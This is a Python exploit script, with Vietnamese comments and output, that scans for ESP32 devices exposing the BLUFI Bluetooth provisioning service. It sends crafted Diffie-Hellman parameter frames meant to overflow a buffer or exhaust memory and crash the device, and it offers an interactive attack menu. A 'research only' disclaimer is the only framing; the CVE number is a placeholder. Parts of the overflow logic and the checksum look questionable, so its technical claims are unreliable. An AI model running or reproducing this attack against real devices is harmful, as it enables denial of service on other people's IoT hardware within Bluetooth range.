#!/usr/bin/env python3
"""
Exploit script cho lỗ hổng DH Buffer Overflow trong ESP32 BLUFI
Lỗ hổng: V3L - CVE-XXXX-XXXX (DH Buffer Overflow)

CHỈ SỬ DỤNG CHO MỤC ĐÍCH NGHIÊN CỨU VÀ HỌC TẬP
"""

import asyncio
import struct
from bleak import BleakClient, BleakScanner
import sys

# BLUFI Service UUIDs
BLUFI_SERVICE_UUID = "0000ff00-0000-1000-8000-00805f9b34fb"
BLUFI_NOTIFY_UUID = "0000ff01-0000-1000-8000-00805f9b34fb"  # Notify characteristic
BLUFI_WRITE_UUID = "0000ff02-0000-1000-8000-00805f9b34fb"    # Write characteristic

# BLUFI Frame types
BLUFI_TYPE_CTRL = 0x00
BLUFI_TYPE_DATA = 0x01

# BLUFI Control subtypes
BLUFI_CTRL_SUBTYPE_NEG = 0x00  # Negotiate Security

# Security types
SEC_TYPE_DH_PARAM_LEN = 0x00
SEC_TYPE_DH_PARAM_DATA = 0x01

class BLUFIExploit:
    def __init__(self, device_address):
        self.device_address = device_address
        self.client = None
        self.connected = False
        
    async def connect(self):
        """Kết nối đến ESP32 qua BLE"""
        print(f"[*] Đang tìm kiếm thiết bị {self.device_address}...")
        print(f"[*] Lưu ý: ESP32 phải đang ở trạng thái advertising (chưa kết nối với thiết bị nào)")
        print(f"[*] Nếu ESP32 đã kết nối, hãy ngắt kết nối hoặc reset ESP32\n")
        
        try:
            # Thử tìm thiết bị với timeout dài hơn
            device = await BleakScanner.find_device_by_address(
                self.device_address, 
                timeout=15.0
            )
            
            if device is None:
                print(f"[-] Không tìm thấy thiết bị {self.device_address}")
                print(f"\n[!] Nguyên nhân có thể:")
                print(f"    1. ESP32 đang kết nối với thiết bị khác (ngắt kết nối trước)")
                print(f"    2. MAC address không đúng")
                print(f"    3. Bluetooth adapter không hoạt động")
                print(f"    4. ESP32 chưa khởi động xong")
                print(f"\n[*] Thử quét tất cả thiết bị:")
                print(f"    python {__file__} scan")
                return False
                
            print(f"[+] Tìm thấy thiết bị: {device.name if device.name else 'Unknown'}")
            print(f"[*] Đang kết nối...")
            self.client = BleakClient(device)
            await self.client.connect(timeout=10.0)
            self.connected = True
            print(f"[+] Đã kết nối thành công!")
            return True
        except Exception as e:
            print(f"[-] Lỗi kết nối: {e}")
            print(f"\n[!] Nguyên nhân có thể:")
            print(f"    1. ESP32 đang kết nối với thiết bị khác")
            print(f"    2. Thiết bị không trong phạm vi")
            print(f"    3. Bluetooth adapter có vấn đề")
            return False
    
    async def disconnect(self):
        """Ngắt kết nối"""
        if self.client and self.connected:
            await self.client.disconnect()
            self.connected = False
            print("[*] Đã ngắt kết nối")
    
    def build_blufi_frame(self, frame_type, frame_ctrl, sequence, data):
        """Xây dựng BLUFI frame"""
        # Frame format: [Type(1)][Ctrl(1)][Seq(2)][Length(2)][Data(N)][Checksum(2)]
        length = len(data)
        frame = bytearray()
        frame.append(frame_type)  # Type
        frame.append(frame_ctrl)  # Ctrl
        frame.extend(struct.pack(">H", sequence))  # Sequence (big-endian)
        frame.extend(struct.pack(">H", length))    # Length (big-endian)
        frame.extend(data)                         # Data
        
        # Simple checksum (CRC16 sẽ được tính sau)
        checksum = 0
        for b in frame:
            checksum ^= b
        frame.extend(struct.pack(">H", checksum))
        
        return bytes(frame)
    
    async def send_dh_param_len(self, length):
        """Gửi SEC_TYPE_DH_PARAM_LEN với giá trị tùy chỉnh"""
        print(f"\n[*] Gửi SEC_TYPE_DH_PARAM_LEN với length = {length} (0x{length:04x})")
        
        # Payload: [SEC_TYPE][LEN_HIGH][LEN_LOW]
        payload = bytearray()
        payload.append(SEC_TYPE_DH_PARAM_LEN)
        payload.append((length >> 8) & 0xFF)  # High byte
        payload.append(length & 0xFF)          # Low byte
        
        # Build BLUFI frame
        frame = self.build_blufi_frame(
            frame_type=BLUFI_TYPE_CTRL,
            frame_ctrl=BLUFI_CTRL_SUBTYPE_NEG,
            sequence=0x0001,
            data=payload
        )
        
        try:
            await self.client.write_gatt_char(BLUFI_WRITE_UUID, frame)
            print(f"[+] Đã gửi SEC_TYPE_DH_PARAM_LEN")
            await asyncio.sleep(0.5)  # Chờ ESP32 xử lý
            return True
        except Exception as e:
            print(f"[-] Lỗi gửi dữ liệu: {e}")
            return False
    
    async def send_dh_param_data(self, data):
        """Gửi SEC_TYPE_DH_PARAM_DATA với data tùy chỉnh"""
        print(f"\n[*] Gửi SEC_TYPE_DH_PARAM_DATA với length = {len(data)} bytes")
        
        # Payload: [SEC_TYPE][DATA...]
        payload = bytearray()
        payload.append(SEC_TYPE_DH_PARAM_DATA)
        payload.extend(data)
        
        # Build BLUFI frame
        frame = self.build_blufi_frame(
            frame_type=BLUFI_TYPE_CTRL,
            frame_ctrl=BLUFI_CTRL_SUBTYPE_NEG,
            sequence=0x0002,
            data=payload
        )
        
        try:
            await self.client.write_gatt_char(BLUFI_WRITE_UUID, frame)
            print(f"[+] Đã gửi SEC_TYPE_DH_PARAM_DATA")
            await asyncio.sleep(1.0)  # Chờ ESP32 xử lý (có thể crash)
            return True
        except Exception as e:
            print(f"[-] Lỗi gửi dữ liệu: {e}")
            return False
    
    async def exploit_overflow(self, overflow_size=1024):
        """Thực hiện tấn công buffer overflow"""
        print("\n" + "="*60)
        print("  BẮT ĐẦU TẤN CÔNG DH BUFFER OVERFLOW")
        print("="*60)
        
        # Bước 1: Gửi dh_param_len lớn
        # Giá trị lớn để gây malloc quá mức hoặc chuẩn bị buffer lớn
        large_len = overflow_size
        await self.send_dh_param_len(large_len)
        
        await asyncio.sleep(0.5)
        
        # Bước 2: Gửi data ngắn hơn dh_param_len để gây overflow
        # Tạo data ngắn với pattern có thể nhận biết
        short_data = b'A' * 10  # Chỉ 10 bytes thay vì overflow_size bytes
        
        print(f"\n[!] ATTACK: Gửi {len(short_data)} bytes nhưng ESP32 mong đợi {large_len} bytes")
        print(f"[!] Điều này sẽ gây buffer overflow trong memcpy()")
        
        await self.send_dh_param_data(short_data)
        
        print("\n[*] Đang chờ phản hồi từ ESP32...")
        print("[*] Nếu ESP32 crash, bạn sẽ thấy mất kết nối BLE")
        await asyncio.sleep(3)
        
        # Kiểm tra xem ESP32 còn kết nối không
        if self.connected:
            try:
                # Thử đọc một characteristic để kiểm tra
                services = await self.client.get_services()
                print("[?] ESP32 vẫn còn kết nối (có thể không bị crash)")
            except:
                print("[!] ESP32 đã mất kết nối - CÓ THỂ ĐÃ BỊ CRASH!")
        else:
            print("[!] ESP32 đã mất kết nối - CÓ THỂ ĐÃ BỊ CRASH!")
    
    async def exploit_malloc_exhaustion(self, huge_size=65535):
        """Tấn công bằng cách gây memory exhaustion"""
        print("\n" + "="*60)
        print("  TẤN CÔNG MEMORY EXHAUSTION")
        print("="*60)
        
        # Gửi dh_param_len cực lớn để gây malloc quá mức
        print(f"\n[*] Gửi SEC_TYPE_DH_PARAM_LEN với size = {huge_size} (0x{huge_size:04x})")
        print(f"[!] Điều này sẽ cố gắng malloc {huge_size} bytes - có thể gây crash")
        
        await self.send_dh_param_len(huge_size)
        await asyncio.sleep(2)
        
        # Kiểm tra kết nối
        if not self.connected:
            print("[!] ESP32 đã mất kết nối - CÓ THỂ ĐÃ BỊ CRASH DO MALLOC!")


async def scan_blufi_devices():
    """Quét các thiết bị BLUFI"""
    print("[*] Đang quét thiết bị BLE (timeout 15 giây)...")
    print("[*] Lưu ý: Chỉ thiết bị đang advertising mới được phát hiện")
    print("[*] Nếu ESP32 đã kết nối với thiết bị khác, sẽ không thấy\n")
    
    try:
        devices = await BleakScanner.discover(timeout=15.0)
        
        print(f"\n[*] Tìm thấy {len(devices)} thiết bị BLE")
        print("="*60)
        
        blufi_devices = []
        all_devices = []
        
        for device in devices:
            all_devices.append(device)
            name = device.name if device.name else "Unknown"
            rssi = device.rssi if hasattr(device, 'rssi') else "N/A"
            
            # Tìm thiết bị BLUFI
            if device.name and ("BLUFI" in device.name.upper()):
                blufi_devices.append(device)
                print(f"[+] BLUFI: {name} - {device.address} (RSSI: {rssi})")
            elif device.name and ("ESP" in device.name.upper()):
                print(f"[?] ESP Device: {name} - {device.address} (RSSI: {rssi})")
            else:
                print(f"[ ] {name} - {device.address} (RSSI: {rssi})")
        
        print("="*60)
        
        if blufi_devices:
            print(f"\n[+] Tìm thấy {len(blufi_devices)} thiết bị BLUFI:")
            for i, dev in enumerate(blufi_devices, 1):
                print(f"    {i}. {dev.name} - {dev.address}")
        else:
            print(f"\n[-] Không tìm thấy thiết bị BLUFI")
            print(f"[!] Nguyên nhân có thể:")
            print(f"    1. ESP32 đang kết nối với thiết bị khác (ngắt kết nối trước)")
            print(f"    2. ESP32 chưa khởi động xong")
            print(f"    3. ESP32 không trong phạm vi")
            print(f"    4. Bluetooth adapter không hoạt động")
            if all_devices:
                print(f"\n[*] Đã phát hiện {len(all_devices)} thiết bị BLE khác")
                print(f"[*] Kiểm tra xem có thiết bị ESP nào không (tên chứa 'ESP')")
        
        return blufi_devices
    except Exception as e:
        print(f"[-] Lỗi khi quét: {e}")
        print(f"[!] Kiểm tra Bluetooth adapter có hoạt động không")
        return []


async def main():
    print("="*60)
    print("  ESP32 BLUFI DH Buffer Overflow Exploit")
    print("  CHỈ SỬ DỤNG CHO MỤC ĐÍCH NGHIÊN CỨU")
    print("="*60)
    
    if len(sys.argv) < 2:
        print("\nCách sử dụng:")
        print(f"  {sys.argv[0]} <device_address>")
        print("\nHoặc quét thiết bị:")
        print(f"  {sys.argv[0]} scan")
        print("\nVí dụ:")
        print(f"  {sys.argv[0]} AA:BB:CC:DD:EE:FF")
        sys.exit(1)
    
    device_address = sys.argv[1].upper()
    
    if device_address == "SCAN":
        devices = await scan_blufi_devices()
        if not devices:
            print("[-] Không tìm thấy thiết bị BLUFI")
        sys.exit(0)
    
    exploit = BLUFIExploit(device_address)
    
    try:
        # Kết nối
        if not await exploit.connect():
            sys.exit(1)
        
        # Chờ một chút để thiết lập kết nối
        await asyncio.sleep(1)
        
        # Menu tấn công
        print("\n" + "="*60)
        print("  MENU TẤN CÔNG")
        print("="*60)
        print("1. Buffer Overflow Attack (dh_param_len lớn, data ngắn)")
        print("2. Memory Exhaustion Attack (malloc cực lớn)")
        print("3. Custom Attack (tùy chỉnh)")
        print("="*60)
        
        choice = input("\nChọn loại tấn công (1-3): ").strip()
        
        if choice == "1":
            size = input("Nhập overflow size (mặc định 1024): ").strip()
            size = int(size) if size else 1024
            await exploit.exploit_overflow(size)
            
        elif choice == "2":
            size = input("Nhập malloc size (mặc định 65535): ").strip()
            size = int(size) if size else 65535
            await exploit.exploit_malloc_exhaustion(size)
            
        elif choice == "3":
            # Custom attack
            len_val = input("Nhập dh_param_len: ").strip()
            len_val = int(len_val) if len_val else 1024
            
            data_len = input("Nhập data length (nhỏ hơn len để overflow): ").strip()
            data_len = int(data_len) if data_len else 10
            
            await exploit.send_dh_param_len(len_val)
            await asyncio.sleep(0.5)
            data = b'X' * data_len
            await exploit.send_dh_param_data(data)
        
        print("\n[*] Tấn công hoàn tất")
        
    except KeyboardInterrupt:
        print("\n[*] Dừng bởi người dùng")
    except Exception as e:
        print(f"\n[-] Lỗi: {e}")
        import traceback
        traceback.print_exc()
    finally:
        await exploit.disconnect()


if __name__ == "__main__":
    asyncio.run(main())

